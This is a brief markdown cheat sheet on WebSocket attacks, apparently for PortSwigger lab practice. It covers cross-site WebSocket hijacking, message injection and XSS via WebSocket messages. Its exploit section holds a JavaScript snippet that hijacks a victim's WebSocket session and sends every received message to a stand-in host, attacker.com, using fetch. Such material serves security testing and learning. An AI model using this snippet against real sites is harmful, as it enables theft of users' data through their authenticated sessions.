# WebSocket Attacks - Payload Reference

## Cross-Site WebSocket Hijacking (CSWH)

### Detection
```
# Check if WebSocket handshake validates Origin header
# If no Origin validation → CSWH possible
```

### Exploit
```javascript
// Create WebSocket to target
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"get_data"}');
};
ws.onmessage = function(event) {
    // Exfiltrate data
    fetch('https://attacker.com/exfil?data=' + encodeURIComponent(event.data));
};
```

## WebSocket Injection

### Message Injection
```
# If user input goes into WebSocket messages
# Inject payload into the message content
```

### Cross-Site Scripting via WebSocket
```
# If WebSocket messages are reflected in DOM
# Inject XSS payload in WebSocket message
```

## PortSwigger Lab Approach
1. Intercept WebSocket handshake in Burp
2. Check Origin header validation
3. Modify WebSocket messages
4. Test for injection in message content
5. Test for CSWH by creating cross-origin WebSocket
